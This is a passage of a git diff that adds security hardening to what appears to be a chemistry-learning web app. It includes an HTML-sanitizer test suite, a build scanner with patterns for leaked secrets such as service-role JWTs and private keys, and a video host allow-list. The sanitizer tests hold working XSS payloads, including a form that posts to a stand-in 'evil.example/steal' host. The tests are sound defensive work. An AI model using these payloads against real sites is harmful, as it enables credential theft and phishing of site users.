@@ -1,0 +1,850 @@
+diff --git a/package.json b/package.json
+index 09a2d09..8f27568 100644
+--- a/package.json
++++ b/package.json
+@@ -15,7 +15,7 @@
+     "test:state-persistence": "node scripts/test-state-persistence.mjs",
+     "verify:rich-text": "node scripts/verify-rich-text-editor.mjs",
+     "verify:state": "node scripts/verify-state-persistence.mjs",
+-    "test": "npm run test:disaster-recovery && npm run test:scientific-rendering && npm run test:rich-text-selection && npm run test:rich-text-ops && npm run test:state-persistence && npm run test:ideal-gas && npm run test:gas-laws && npm run test:gas-laws-ui && npm run test:dashboard-layout && npm run test:image-viewer && npm run test:bonding && npm run test:vsepr && npm run test:hybridisation && npm run test:imf && npm run test:nmr-physics && npm run test:nmr-ui && npm run test:nmr-molecular && npm run test:nmr-steps && npm run test:ir && npm run test:ms && npm run test:structure && npm run test:simulation-shell && npm run test:build-atom && npm run test:electron-config && npm run test:heating-cooling && npm run test:auth-signup",
++    "test": "npm run test:disaster-recovery && npm run test:scientific-rendering && npm run test:rich-text-selection && npm run test:rich-text-ops && npm run test:state-persistence && npm run test:ideal-gas && npm run test:gas-laws && npm run test:gas-laws-ui && npm run test:dashboard-layout && npm run test:image-viewer && npm run test:bonding && npm run test:vsepr && npm run test:hybridisation && npm run test:imf && npm run test:nmr-physics && npm run test:nmr-ui && npm run test:nmr-molecular && npm run test:nmr-steps && npm run test:ir && npm run test:ms && npm run test:structure && npm run test:simulation-shell && npm run test:build-atom && npm run test:electron-config && npm run test:heating-cooling && npm run test:auth-signup && npm run test:security",
+     "test:ideal-gas": "node scripts/test-ideal-gas-model.mjs",
+     "test:gas-laws": "node scripts/test-gas-laws-model.mjs",
+     "test:gas-laws-ui": "node scripts/test-gas-laws-ui.mjs",
+@@ -42,6 +42,8 @@
+     "test:build-atom": "node scripts/test-build-atom-controls.mjs",
+     "test:electron-config": "node scripts/test-electron-config.mjs",
+     "test:auth-signup": "node scripts/test-auth-signup-confirmation.mjs",
++    "test:security": "node scripts/test-sanitize-html.mjs && node scripts/test-security-libs.mjs && node scripts/check-learn-export-controls.mjs",
++    "check:build-security": "node scripts/check-build-security.mjs dist",
+     "test:heating-cooling": "node scripts/test-heating-cooling-curve.mjs",
+     "verify:build-atom-shells": "node scripts/verify-build-atom-shells.mjs",
+     "verify:build-atom-heating": "node scripts/verify-build-atom-heating.mjs",
+@@ -55,6 +57,7 @@
+     "@react-three/fiber": "^9.7.0",
+     "@supabase/supabase-js": "^2.115.0",
+     "docx": "^9.7.1",
++    "dompurify": "^3.4.17",
+     "jspdf": "^4.2.1",
+     "jszip": "^3.10.2",
+     "lucide-react": "^1.39.0",
+@@ -71,6 +74,6 @@
+     "jsdom": "^30.1.1",
+     "oxlint": "^1.79.0",
+     "tailwindcss": "^4.3.3",
+-    "vite": "^8.2.2"
++    "vite": "^8.3.8"
+   }
+ }
+diff --git a/scripts/check-build-security.mjs b/scripts/check-build-security.mjs
+new file mode 100644
+index 0000000..b2dca5d
+--- /dev/null
++++ b/scripts/check-build-security.mjs
+@@ -0,0 +1,28 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan P1/P9). Inspects a built dist/ directory. Never prints secret values (only file name + rule).
++// Usage: node scripts/check-build-security.mjs [dist]
++import fs from "node:fs"; import path from "node:path";
++const dist = process.argv[2] || "dist"; const fail = []; const note = [];
++const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
++const files = walk(dist);
++for (const f of files) {
++  const rel = path.relative(dist, f);
++  if (/\.map$/.test(f)) fail.push(`source map shipped: ${rel}`);
++  if (/\.(sql|env|bak|backup|log|zip|tar|gz|pem|key)$/i.test(f) || /(^|\/)\.(env|git(?!keep))/.test(rel)) fail.push(`non-frontend file shipped: ${rel}`);
++  if (/^(supabase|migrations|docs|scripts|node_modules|src)\//.test(rel)) fail.push(`source/dev directory shipped: ${rel}`);
++  if (/\.(js|css|html)$/.test(f)) {
++    const t = fs.readFileSync(f, "utf8");
++    if (/sourceMappingURL=/.test(t)) fail.push(`sourceMappingURL comment: ${rel}`);
++    if (/service_role/i.test(t) && /eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\./.test(t)) {
++      for (const m of t.matchAll(/eyJ[A-Za-z0-9_-]{20,}\.([A-Za-z0-9_-]{20,})\./g)) { try { if (JSON.parse(Buffer.from(m[1], "base64url").toString()).role === "service_role") fail.push(`service_role JWT in ${rel}`); } catch { /* not JSON */ } }
++    }
++    if (/sb_secret_[A-Za-z0-9_-]{10,}/.test(t)) fail.push(`sb_secret_ key pattern in ${rel}`);
++    if (/postgres(ql)?:\/\/[^\s"']+:[^\s"']+@/.test(t)) fail.push(`database connection string pattern in ${rel}`);
++    if (/-----BEGIN [A-Z ]*PRIVATE KEY-----/.test(t)) fail.push(`private key block in ${rel}`);
++  }
++}
++const pub = files.map((f) => path.relative(dist, f)).filter((r) => !r.startsWith("assets/") && r !== "index.html");
++note.push(`non-asset files in dist (review: only things the frontend needs): ${pub.join(", ") || "(none)"}`);
++note.push(`${files.length} files, ${files.filter((f) => f.endsWith(".js")).length} js chunks (static JS is retrievable by anyone who can load the site)`);
++note.forEach((n) => console.log("INFO", n)); fail.forEach((x) => console.log("FAIL", x));
++console.log(fail.length ? `${fail.length} problem(s)` : "OK"); process.exit(fail.length ? 1 : 0);
+diff --git a/scripts/check-learn-export-controls.mjs b/scripts/check-learn-export-controls.mjs
+new file mode 100644
+index 0000000..24d8cd0
+--- /dev/null
++++ b/scripts/check-learn-export-controls.mjs
+@@ -0,0 +1,15 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan P1). Static guard: student-facing Learn code must not gain application-provided print/PDF/Word/download controls.
++// Allow-list = known, reviewed uses. Run: node scripts/check-learn-export-controls.mjs   (exit 1 on a new hit).
++import fs from "node:fs"; import path from "node:path";
++const ROOTS = ["src/components/learn", "src/components/image-viewer", "src/pages/student/learn", "src/pages/learn"].filter((d) => fs.existsSync(d));
++const PATTERN = /window\.print\s*\(|from\s+["']jspdf["']|from\s+["']docx["']|\bsaveAs\s*\(|createObjectURL|\bdownload\s*=|\.download\b|<a[^>]*\bdownload\b|toBlob\s*\(|toDataURL\s*\(/;
++const ALLOW = [{ file: "src/components/image-viewer/EnlargeGraphicButton.jsx", why: "toDataURL draws a canvas into the in-page enlarge dialog; no file is produced" }];
++const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
++let bad = 0;
++for (const f of ROOTS.flatMap(walk).filter((f) => /\.(jsx?|tsx?)$/.test(f))) {
++  fs.readFileSync(f, "utf8").split("\n").forEach((line, i) => {
++    if (PATTERN.test(line) && !ALLOW.some((a) => a.file === f)) { console.log(`HIT ${f}:${i + 1}: ${line.trim().slice(0, 120)}`); bad++; }
++  });
++}
++console.log(bad ? `${bad} unreviewed export-like call(s)` : `OK: no export controls in ${ROOTS.join(", ")}`); process.exit(bad ? 1 : 0);
+diff --git a/scripts/compare-lesson-images.mjs b/scripts/compare-lesson-images.mjs
+new file mode 100644
+index 0000000..191f7cf
+--- /dev/null
++++ b/scripts/compare-lesson-images.mjs
+@@ -0,0 +1,15 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan P5). Before/after proof that every image a lesson references still loads and is byte-identical.
++// Input: a JSON list of {page_id, label, before: <public URL>, after: <signed URL or storage ref already resolved>} produced by the staging
++// harness (see plan P5 test T5.x). Fetches both, compares status, content-type and SHA-256. Prints no URLs with tokens (path only).
++import fs from "node:fs"; import crypto from "node:crypto";
++const items = JSON.parse(fs.readFileSync(process.argv[2] || "image-pairs.json", "utf8"));
++const get = async (u) => { try { const r = await fetch(u); const b = Buffer.from(await r.arrayBuffer()); return { s: r.status, t: r.headers.get("content-type"), h: crypto.createHash("sha256").update(b).digest("hex") }; } catch (e) { return { s: 0, t: "", h: "" }; } };
++const short = (u) => { try { return new URL(u).pathname; } catch { return "?"; } };
++let bad = 0;
++for (const it of items) {
++  const [a, b] = await Promise.all([get(it.before), get(it.after)]);
++  const ok = a.s === 200 && b.s === 200 && a.h === b.h && a.t === b.t;
++  if (!ok) { bad++; console.log(`DIFF ${it.page_id} ${short(it.before)} before=${a.s}/${a.t} after=${b.s}/${b.t} same=${a.h === b.h}`); }
++}
++console.log(`${items.length - bad}/${items.length} identical`); process.exit(bad ? 1 : 0);
+diff --git a/scripts/copy-media-to-private.mjs b/scripts/copy-media-to-private.mjs
+new file mode 100644
+index 0000000..7dbaaae
+--- /dev/null
++++ b/scripts/copy-media-to-private.mjs
+@@ -0,0 +1,42 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan P5) -- NOT RUN against any live system. COPY (never move/delete) objects from the public buckets to the
++// private ones, preserving the path, then verify byte-for-byte by SHA-256. DRY-RUN by default; --apply is required to write.
++// Credentials come ONLY from environment variables at run time (SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY). They are never printed or saved.
++// Run from an admin workstation, never from the browser bundle. Usage: node copy-media-to-private.mjs [--apply] [--only=learn|question] [--manifest=path.json]
++import { createClient } from "@supabase/supabase-js"; import crypto from "node:crypto"; import fs from "node:fs";
++const args = Object.fromEntries(process.argv.slice(2).map((a) => { const [k, v] = a.replace(/^--/, "").split("="); return [k, v ?? true]; }));
++const PAIRS = [["learn-media", "learn-media-private", "learn"], ["question-media", "question-media-private", "question"]].filter(([, , k]) => !args.only || args.only === k);
++const { SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY } = process.env;
++if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) { console.error("Set SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY in the environment (not echoed). Nothing done."); process.exit(2); }
++const sb = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false } });
++const sha = (buf) => crypto.createHash("sha256").update(Buffer.from(buf)).digest("hex");
++async function listAll(bucket, prefix = "") {
++  const out = []; let offset = 0;
++  for (;;) {
++    const { data, error } = await sb.storage.from(bucket).list(prefix, { limit: 100, offset, sortBy: { column: "name", order: "asc" } });
++    if (error) throw error; if (!data.length) break;
++    for (const e of data) { const p = prefix ? `${prefix}/${e.name}` : e.name; if (e.id === null) out.push(...await listAll(bucket, p)); else out.push(p); }
++    offset += data.length; if (data.length < 100) break;
++  }
++  return out;
++}
++const manifest = [];
++for (const [src, dst] of PAIRS) {
++  const paths = await listAll(src); console.log(`${src}: ${paths.length} objects`);
++  for (const p of paths) {
++    const row = { src, dst, path: p, status: "planned" };
++    if (args.apply) {
++      const a = await sb.storage.from(src).download(p); if (a.error) { row.status = "download_failed"; manifest.push(row); continue; }
++      const buf = await a.data.arrayBuffer(); row.sha256 = sha(buf); row.bytes = buf.byteLength;
++      const up = await sb.storage.from(dst).upload(p, buf, { contentType: a.data.type || undefined, upsert: false });
++      if (up.error && !/already exists|Duplicate/i.test(up.error.message)) { row.status = "upload_failed"; manifest.push(row); continue; }
++      const b = await sb.storage.from(dst).download(p);
++      row.status = !b.error && sha(await b.data.arrayBuffer()) === row.sha256 ? "verified" : "MISMATCH";
++    }
++    manifest.push(row);
++  }
++}
++const file = args.manifest || "media-copy-manifest.json"; fs.writeFileSync(file, JSON.stringify(manifest, null, 1));
++const c = manifest.reduce((m, r) => (m[r.status] = (m[r.status] || 0) + 1, m), {});
++console.log(args.apply ? "APPLIED (copy only; public originals untouched)" : "DRY RUN (nothing written)", c, "manifest:", file);
++process.exit(manifest.some((r) => /failed|MISMATCH/.test(r.status)) ? 1 : 0);
+diff --git a/scripts/test-disaster-recovery.mjs b/scripts/test-disaster-recovery.mjs
+index f6d850f..9a43f17 100644
+--- a/scripts/test-disaster-recovery.mjs
++++ b/scripts/test-disaster-recovery.mjs
+@@ -455,7 +455,7 @@ await (async () => {
+     // entries (group "question_bank"/"question_papers") and so are already
+     // covered by the spread below, exactly like every other backed-up table.
+     ...c.BACKUP_DATASETS.map((t) => t.table),
+-    "user_access_overview", "platform_settings_public", // views over accounted-for base tables
++    "user_access_overview", "platform_settings_public", "platform_export_policy", // views over accounted-for base tables
+   ]);
+ 
+   test("every .from(\"table\") name found in src/ is accounted for (content, backed up, or excluded with a reason)", () => {
+diff --git a/scripts/test-sanitize-html.mjs b/scripts/test-sanitize-html.mjs
+new file mode 100644
+index 0000000..1bfa145
+--- /dev/null
++++ b/scripts/test-sanitize-html.mjs
+@@ -0,0 +1,51 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan). jsdom test for the hardened sanitizeHtml: hostile payloads are neutralised AND editor output survives.
++import assert from "node:assert/strict";
++import { JSDOM } from "jsdom";
++const dom = new JSDOM("<!doctype html><body></body>", { url: "http://localhost/" });
++globalThis.window = dom.window; globalThis.document = dom.window.document;
++const { sanitizeHtml, filterStyleAttribute } = await import("../src/lib/sanitizeHtml.js");
++let passed = 0, failed = 0;
++const test = (n, f) => { try { f(); console.log(`  PASS  ${n}`); passed++; } catch (e) { console.log(`  FAIL  ${n}\n        ${e.message}`); failed++; } };
++const hostile = {
++  script: `<p>hi</p><script>alert(1)</script>`, onerror: `<img src=x onerror="alert(1)">`, svg: `<svg onload="alert(1)"><circle r=5></circle></svg>`,
++  jshref: `<a href="javascript:alert(1)">x</a>`, jshrefEnt: `<a href="jav&#x09;ascript:alert(1)">x</a>`, dataHref: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
++  iframe: `<iframe src="https://evil.example/"></iframe>`, srcdoc: `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, obj: `<object data="https://evil.example/x"></object><embed src="https://evil.example/x">`,
++  form: `<form action="https://evil.example/steal"><input name=pw><button>go</button></form>`, styleTag: `<style>body{display:none}</style><p>x</p>`,
++  expr: `<p style="width:expression(alert(1))">x</p>`, overlay: `<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999">Session expired</p>`,
++  bgimg: `<p style="background-image:url(https://evil.example/t.gif)">x</p>`, meta: `<meta http-equiv="refresh" content="0;url=https://evil.example">`, base: `<base href="https://evil.example/">`,
++  btn: `<button formaction="https://evil.example">x</button>`, video: `<video src="https://evil.example/v.mp4"></video>`, mxss: `<math><mi><style><img src=x onerror=alert(1)></style></mi></math>`,
++  details: `<details open ontoggle="alert(1)">x</details>`, noscript: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
++};
++for (const [name, html] of Object.entries(hostile)) {
++  test(`neutralises ${name}`, () => {
++    const out = sanitizeHtml(html);
++    const d = new JSDOM(`<body>${out}</body>`).window.document;
++    assert.equal(d.querySelectorAll("script,iframe,object,embed,form,input,button,style,svg,math,video,meta,base,link").length, 0, out);
++    for (const el of d.querySelectorAll("*")) {
++      for (const a of el.attributes) {
++        assert.ok(!/^on/i.test(a.name), `${a.name} in ${out}`);
++        assert.ok(!/javascript:|expression\(|url\(|position\s*:|z-index/i.test(a.value.replace(/[\s\u0000-\u001f]/g, "")) || a.name === "href" && false, `${a.name}=${a.value}`);
++      }
++    }
++  });
++}
++const keep = [
++  `<h2>Title</h2><p style="text-align: center; margin-left: 40px">x</p>`,
++  `<span style="font-size: 18px; font-family: Georgia, serif; color: #ff0000; background-color: #ffff00">x</span>`,
++  `<p><b>b</b><i>i</i><u>u</u><s>s</s>H<sub>2</sub>O x<sup>2</sup></p><ul><li>a</li></ul><ol><li>b</li></ol>`,
++  `<a href="https://example.com/x">l</a>`, `<table><tbody><tr><td>1</td></tr></tbody></table>`,
++  `<img src="https://abc.supabase.co/storage/v1/object/public/learn-media/a.png" alt="a">`,
++];
++keep.forEach((h, i) => test(`preserves editor output #${i + 1}`, () => {
++  const a = new JSDOM(`<body>${h}</body>`).window.document.body, b = new JSDOM(`<body>${sanitizeHtml(h)}</body>`).window.document.body;
++  const norm = (n) => [...n.querySelectorAll("*")].map((e) => e.tagName + "|" + [...e.attributes].map((x) => x.name + "=" + x.value.replace(/;\s*$/, "").replace(/\s+/g, " ")).filter((s) => !s.startsWith("rel=")).sort().join(","));
++  assert.deepEqual(norm(b), norm(a));
++}));
++test("target attribute is dropped (same as baseline DOMPurify default)", () => assert.ok(!/target=/.test(sanitizeHtml(`<a href="https://e.com" target="_blank">x</a>`))));
++test("allowedImageHosts drops foreign images, keeps listed", () => {
++  const o = sanitizeHtml(`<img src="https://evil.example/a.png"><img src="https://abc.supabase.co/a.png">`, { allowedImageHosts: ["abc.supabase.co"] });
++  assert.ok(!o.includes("evil.example")); assert.ok(o.includes("abc.supabase.co"));
++});
++test("filterStyleAttribute keeps benign, drops risky", () => assert.equal(filterStyleAttribute("color:red; position:fixed; width:url(x)"), "color:red"));
++console.log(`\n${passed} passed, ${failed} failed`); process.exit(failed ? 1 : 0);
+diff --git a/scripts/test-security-libs.mjs b/scripts/test-security-libs.mjs
+new file mode 100644
+index 0000000..1f63d34
+--- /dev/null
++++ b/scripts/test-security-libs.mjs
+@@ -0,0 +1,60 @@
++#!/usr/bin/env node
++// DRAFT (docs/security-plan). Pure-logic tests, no Supabase, no DOM: embedUrl, exportPolicy, asyncCache, lessonDeliveryClient, resolveStorageRefs, backupCrypto.
++import assert from "node:assert/strict";
++import { classifyVideoUrl } from "../src/lib/embedUrl.js";
++import { resolveExportPolicy, DEFAULT_EXPORT_POLICY } from "../src/lib/exportPolicyCore.js";
++import { createAsyncCache } from "../src/lib/asyncCache.js";
++import { createLessonDeliveryClient, fallbackStats } from "../src/lib/lessonDeliveryClient.js";
++import { resolveStorageRefs, needsRefresh } from "../src/lib/resolveStorageRefs.js";
++import { encryptBackup, decryptBackup } from "../src/lib/backupCrypto.js";
++let p = 0, f = 0;
++const test = async (n, fn) => { try { await fn(); console.log("  PASS ", n); p++; } catch (e) { console.log("  FAIL ", n, "\n       ", e.message); f++; } };
++
++await test("youtube watch -> embed", () => assert.deepEqual(classifyVideoUrl("https://www.youtube.com/watch?v=dQw4w9WgXcQ"), { kind: "embed", url: "https://www.youtube.com/embed/dQw4w9WgXcQ" }));
++await test("youtu.be -> embed", () => assert.equal(classifyVideoUrl("https://youtu.be/dQw4w9WgXcQ").kind, "embed"));
++await test("vimeo -> player embed", () => assert.equal(classifyVideoUrl("https://vimeo.com/123456").url, "https://player.vimeo.com/video/123456"));
++await test("lookalike host is NOT framed", () => { for (const u of ["https://evilyoutube.com/watch?v=dQw4w9WgXcQ", "https://youtube.com.evil.example/embed/x", "https://notvimeo.com/123"]) assert.notEqual(classifyVideoUrl(u).kind, "embed", u); });
++await test("http / javascript / garbage -> none", () => { for (const u of ["http://www.youtube.com/embed/abc", "javascript:alert(1)", "", null, "not a url"]) assert.equal(classifyVideoUrl(u).kind, "none", String(u)); });
++await test("hosted file -> direct; unknown https -> link", () => { assert.equal(classifyVideoUrl("https://x.example/a.mp4").kind, "direct"); assert.equal(classifyVideoUrl("https://x.example/page").kind, "link"); assert.equal(classifyVideoUrl("https://abc.supabase.co/x", { storageHost: "abc.supabase.co" }).kind, "direct"); });
++
++await test("export policy fails open to today's behaviour", () => { assert.deepEqual(resolveExportPolicy(null), DEFAULT_EXPORT_POLICY); assert.deepEqual(resolveExportPolicy({}), DEFAULT_EXPORT_POLICY); });
++await test("export policy honours explicit false only", () => { const r = resolveExportPolicy({ allow_resource_downloads: false, allow_teacher_exports: "false" }); assert.equal(r.allowResourceDownloads, false); assert.equal(r.allowTeacherExports, true); });
++
++await test("asyncCache dedupes in-flight and expires", async () => {
++  let t = 0, n = 0; const c = createAsyncCache({ ttlMs: 100, now: () => t });
++  const load = async () => ++n; const [a, b] = await Promise.all([c.get("k", load), c.get("k", load)]);
++  assert.equal(a, 1); assert.equal(b, 1); assert.equal(n, 1); t = 99; await c.get("k", load); assert.equal(n, 1); t = 101; assert.equal(await c.get("k", load), 2);
++});
++await test("asyncCache does not cache failures", async () => { const c = createAsyncCache(); await assert.rejects(c.get("k", async () => { throw new Error("x"); })); assert.equal(await c.get("k", async () => 7), 7); });
++
++await test("lesson client pages through has_more", async () => {
++  const calls = []; const rpc = async (fn, a) => { calls.push(a.p_offset); return { data: { ok: true, page: { id: 1 }, blocks: [a.p_offset], has_more: a.p_offset < 2, next_offset: a.p_offset + 1 } }; };
++  const r = await createLessonDeliveryClient({ rpc }).lesson("x"); assert.deepEqual(r.blocks, [0, 1, 2]); assert.deepEqual(calls, [0, 1, 2]);
++});
++await test("lesson client maps rate_limited / denied to errors", async () => {
++  const c = createLessonDeliveryClient({ rpc: async () => ({ data: { ok: false, error: "rate_limited" } }) });
++  await assert.rejects(c.lesson("x"), (e) => e.code === "rate_limited");
++});
++await test("legacy fallback only when RPC missing, and is counted", async () => {
++  const before = fallbackStats.count; const c = createLessonDeliveryClient({ rpc: async () => ({ error: { code: "PGRST202" } }), legacy: { getLesson: async () => ({ legacy: true }) } });
++  assert.deepEqual(await c.lesson("x"), { legacy: true }); assert.equal(fallbackStats.count, before + 1);
++  const d = createLessonDeliveryClient({ rpc: async () => ({ error: { code: "42501", message: "permission denied" } }), legacy: { getLesson: async () => ({ legacy: true }) } });
++  await assert.rejects(d.lesson("x"));
++});
++
++await test("storage refs resolved, https untouched, signer called per bucket", async () => {
++  const seen = []; const signer = async (b, paths) => { seen.push([b, paths.length]); return { data: paths.map((x) => ({ path: x, signedUrl: `https://s/${b}/${x}?t=1` })) }; };
++  const c = { html: '<img src="storage://learn-media-private/a/b.png">', url: "https://abc.supabase.co/storage/v1/object/public/learn-media/z.png", n: [{ u: "storage://question-media-private/q.png" }] };
++  const r = await resolveStorageRefs(c, signer);
++  assert.ok(r.content.html.includes("https://s/learn-media-private/a/b.png?t=1")); assert.equal(r.content.url, c.url); assert.ok(r.content.n[0].u.startsWith("https://s/question-media-private/")); assert.equal(seen.length, 2);
++  assert.equal(needsRefresh(r.expiresAt, Date.now()), false); assert.equal(needsRefresh(r.expiresAt, Date.now() + 560_000), true);
++});
++await test("unsignable ref is blanked, never leaks the storage:// path", async () => {
++  const r = await resolveStorageRefs({ s: "storage://b/x.png" }, async () => ({ data: [{ path: "x.png", error: "denied", signedUrl: null }] })); assert.equal(r.content.s, "");
++});
++await test("backup encrypt/decrypt round trip + wrong passphrase", async () => {
++  const env = await encryptBackup('{"a":1}', "correct horse battery", 1000); assert.ok(!env.includes('"a"'));
++  assert.equal(await decryptBackup(env, "correct horse battery"), '{"a":1}'); await assert.rejects(decryptBackup(env, "wrong passphrase!!"));
++  await assert.rejects(encryptBackup("x", "short"));
++});
++console.log(`\n${p} passed, ${f} failed`); process.exit(f ? 1 : 0);
+diff --git a/src/components/learn/LearnBlockRenderer.jsx b/src/components/learn/LearnBlockRenderer.jsx
+index e23b320..09d7d0d 100644
+--- a/src/components/learn/LearnBlockRenderer.jsx
++++ b/src/components/learn/LearnBlockRenderer.jsx
+@@ -10,6 +10,7 @@ import ELabLoader from "../ui/ELabLoader.jsx";
+ import { findPublishedLessonBySyllabusCode } from "../../lib/learnContentService.js";
+ import ZoomableImage from "../image-viewer/ZoomableImage.jsx";
+ import ZoomableHtml from "../image-viewer/ZoomableHtml.jsx";
++import { classifyVideoUrl } from "../../lib/embedUrl.js";
+ import { useNavigate } from "react-router-dom";
+ import { SimulationSessionProvider } from "../interactive-shell/simulationSession.js";
+ import { RICH_TEXT_TYPOGRAPHY, RICH_TEXT_STUDENT_HEADINGS } from "../../lib/richTextStyles.js";
+@@ -62,21 +63,26 @@ export default function LearnBlockRenderer({ block }) {
+ 
+     case "video": {
+       const url = c.url || "";
+-      const isDirectVideo = /\.(mp4|webm|mov)(\?|#|$)/i.test(url) || url.includes("/storage/v1/object/public/learn-media/");
+-      const embedUrl = toEmbedVideoUrl(url);
+       if (!url) return <PlaceholderBlock label="Video not yet configured" />;
++      // Only allow-listed hosts are ever framed (YouTube / Vimeo). Hosted files play in <video>. Anything else is a plain link.
++      const video = classifyVideoUrl(url, { storageHost: import.meta.env.VITE_SUPABASE_URL ? new URL(import.meta.env.VITE_SUPABASE_URL).hostname : "" });
++      if (video.kind === "none") return <PlaceholderBlock label="Video link not supported" />;
+       const widthClass = c.width === "small" ? "w-1/2" : c.width === "medium" ? "w-[70%]" : c.width === "full" ? "w-full" : "w-[85%]";
+       const alignClass = c.alignment === "left" ? "mr-auto" : c.alignment === "right" ? "ml-auto" : "mx-auto";
+       return (
+         <figure>
+-          <div className={`aspect-video overflow-hidden rounded-md bg-black ${widthClass} ${alignClass}`}>
+-            {isDirectVideo ? (
+-              <video src={url} controls preload="metadata" className="h-full w-full object-contain" aria-label={c.caption || "Lesson video"} />
+-            ) : (
+-              <iframe src={embedUrl} title={c.caption || "Lesson video"} className="h-full w-full" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen sandbox="allow-scripts allow-same-origin allow-presentation" />
+-            )}
+-          </div>
+-          {c.caption && <figcaption className="mt-1.5 text-xs text-[var(--color-ink-faint)]">{c.caption}</figcaption>}
++          {video.kind === "link" ? (
++            <p className="text-sm"><a className="text-[var(--color-indigo)] underline" href={video.url} target="_blank" rel="noopener noreferrer">{c.caption || "Open video"}</a></p>
++          ) : (
++            <div className={`aspect-video overflow-hidden rounded-md bg-black ${widthClass} ${alignClass}`}>
++              {video.kind === "direct" ? (
++                <video src={video.url} controls preload="metadata" className="h-full w-full object-contain" aria-label={c.caption || "Lesson video"} />
++              ) : (
++                <iframe src={video.url} title={c.caption || "Lesson video"} className="h-full w-full" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen sandbox="allow-scripts allow-same-origin allow-presentation" referrerPolicy="strict-origin-when-cross-origin" />
++              )}
++            </div>
++          )}
++          {c.caption && video.kind !== "link" && <figcaption className="mt-1.5 text-xs text-[var(--color-ink-faint)]">{c.caption}</figcaption>}
+         </figure>
+       );
+     }
+@@ -449,22 +455,3 @@ function PracticalBlock({ content }) {
+ }
+ 
+ 
+-function toEmbedVideoUrl(url) {
+-  if (!url) return "";
+-  try {
+-    const parsed = new URL(url);
+-    if (parsed.hostname.includes("youtube.com")) {
+-      if (parsed.pathname.startsWith("/embed/")) return url;
+-      const id = parsed.searchParams.get("v");
+-      if (id) return `https://www.youtube.com/embed/${id}`;
+-    }
+-    if (parsed.hostname === "youtu.be") return `https://www.youtube.com/embed/${parsed.pathname.slice(1)}`;
+-    if (parsed.hostname.includes("vimeo.com") && !parsed.hostname.includes("player.")) {
+-      const id = parsed.pathname.split("/").filter(Boolean).pop();
+-      if (id) return `https://player.vimeo.com/video/${id}`;
+-    }
+-  } catch {
+-    return url;
+-  }
+-  return url;
+-}
+diff --git a/src/lib/asyncCache.js b/src/lib/asyncCache.js
+new file mode 100644
+index 0000000..6fda4c2
+--- /dev/null
++++ b/src/lib/asyncCache.js
+@@ -0,0 +1,20 @@
++// Tiny TTL cache with in-flight de-duplication. Used to stop the Learn sidebar, lesson page, search box and welcome page each
++// re-requesting the same lesson catalogue on every navigation (fewer requests = more headroom under server-side rate limits).
++// Failed promises are NOT cached. PURE apart from Date.now().
++export function createAsyncCache({ ttlMs = 60_000, now = () => Date.now() } = {}) {
++  const store = new Map();
++  return {
++    async get(key, loader) {
++      const hit = store.get(key);
++      if (hit && (hit.promise || hit.expires > now())) return hit.promise ?? hit.value;
++      const promise = Promise.resolve().then(loader).then(
++        (value) => { store.set(key, { value, expires: now() + ttlMs }); return value; },
++        (error) => { store.delete(key); throw error; },
++      );
++      store.set(key, { promise });
++      return promise;
++    },
++    clear() { store.clear(); },
++    size() { return store.size; },
++  };
++}
+diff --git a/src/lib/backup/constants.js b/src/lib/backup/constants.js
+index 15fc289..e3b5a63 100644
+--- a/src/lib/backup/constants.js
++++ b/src/lib/backup/constants.js
+@@ -605,7 +605,7 @@ export const EXCLUDED_TABLES = [
+   // application data is eligible for backup regardless of that gap, with
+   // the gap itself surfaced honestly instead of used as a reason to drop
+   // real data from Complete Disaster Recovery.
+-  { table: "user_access_overview / platform_settings_public", reason: "Both are Postgres VIEWs (create or replace view — see admin-access-migration.sql / admin-settings-migration.sql), not base tables: they have no rows of their own to back up. Their underlying base tables (user_access, platform_settings) ARE in BACKUP_DATASETS above; restoring those automatically makes the views correct again.", deploymentTier: DEPLOYMENT_TIER.EXCLUDED },
++  { table: "user_access_overview / platform_settings_public / platform_export_policy", reason: "All are Postgres VIEWs (create or replace view — see admin-access-migration.sql / admin-settings-migration.sql), not base tables: they have no rows of their own to back up. Their underlying base tables (user_access, platform_settings) ARE in BACKUP_DATASETS above; restoring those automatically makes the views correct again.", deploymentTier: DEPLOYMENT_TIER.EXCLUDED },
+   { table: "Supabase Auth sessions/tokens/refresh tokens", reason: "Secrets — never captured anywhere in application code or this backup, by design (spec §12/§35).", deploymentTier: DEPLOYMENT_TIER.EXCLUDED },
+ ];
+ 
+diff --git a/src/lib/backupCrypto.js b/src/lib/backupCrypto.js
+new file mode 100644
+index 0000000..cfc3f60
+--- /dev/null
++++ b/src/lib/backupCrypto.js
+@@ -0,0 +1,21 @@
++// DRAFT (docs/security-plan P7) -- NOT applied. Optional passphrase encryption (AES-256-GCM, PBKDF2-SHA256) for admin backup files so a
++// stolen/forwarded file is not a readable copy of the whole curriculum. Uses WebCrypto only. The passphrase is never stored.
++const ITER = 600_000;
++const enc = new TextEncoder(), dec = new TextDecoder();
++const b64 = (u8) => btoa(String.fromCharCode(...u8)), unb64 = (s) => Uint8Array.from(atob(s), (c) => c.charCodeAt(0));
++async function key(pass, salt, iter) {
++  const base = await crypto.subtle.importKey("raw", enc.encode(pass), "PBKDF2", false, ["deriveKey"]);
